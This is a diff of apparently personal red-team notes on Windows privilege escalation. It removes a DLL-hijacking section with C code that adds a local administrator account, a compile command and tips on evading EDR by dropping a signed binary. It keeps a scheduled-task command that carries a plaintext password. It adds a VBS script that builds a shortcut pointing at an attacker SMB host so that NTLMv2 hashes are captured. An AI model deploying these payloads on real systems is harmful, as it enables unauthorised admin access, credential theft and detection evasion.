@@ -1,46 +1,6 @@
 # Additional PrivEsc
 
 
-> ***IMPORTANT***: We achieve not only `Privilege Escalation`, but also `code-execution` and `persistence`!!!
-
-# DLL Hijack/Sideloading
-<https://www.bordergate.co.uk/windows-privilege-escalation/#DLL-Hijacking>
-The following code can be used to create a malicious DLL:
-
-Bring your own vulnerable signed MS binary:
-
-OLEVIEW
-
-Why? EDR's will check if dll's loaded by LOL windows binaries happen from the right directory - by dropping a signed binary that is not present on the file system, we evding that detection.
-
-Additionally OLEVIEW will
-
-```csharp
-#include <windows.h>
- 
-BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
-    if (dwReason == DLL_PROCESS_ATTACH) {
-        system("cmd.exe /k net user localadmin Password1 /add");
-        system("cmd.exe /k net localgroup administrators localadmin /add");
-        ExitProcess(0);
-    }
-    return TRUE;
-}
-```
-Compile with:
-
-```code
-x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijack.dll
-```
-
-# DLL Hijacking
-onedrive -> Appdata -> cscapi.dll
-
-<https://hijacklibs.net/>
-
-https://juggernaut-sec.com/dll-hijacking/#Hijacking_the_Service_DLL_to_get_a_SYSTEM_Shell
-
-![image](./images/dllsearch.jpg)
 
 
 
@@ -49,3 +9,22 @@ https://juggernaut-sec.com/dll-hijacking/#Hijacking_the_Service_DLL_to_get_a_SYS
 ```powershell
 schtasks /create /tn VulnTask /tr 'c:\MyPrograms\VulnerableTask\VulnTask.exe' /sc ONSTART /RL HIGHEST /RU "Student_adm" /RP "Threathunt25" /F
 ```
+
+---
+
+NTLM RELAYING
+
+save the following as "mail_link.vbs", run it - it creates a malicious link that authenticates to responder sending its NTLMv2 hash.
+
+```vbs
+Set objShell = WScript.CreateObject("WScript.Shell")
+Set lnk = objShell.CreateShortcut("evil_link.lnk")
+lnk.TargetPath = "\\10.0.0.5\icon.ico" 	
+lnk.Arguments = "" 		
+lnk.Description = "" 	
+lnk.IconLocation = "\\10.0.0.5\icon.ico" 
+lnk.WorkingDirectory = "" 
+lnk.Save
+```
+
+<https://github.com/AkuCyberSec/firefox-ntlm-hash-capture-via-lnk-download>
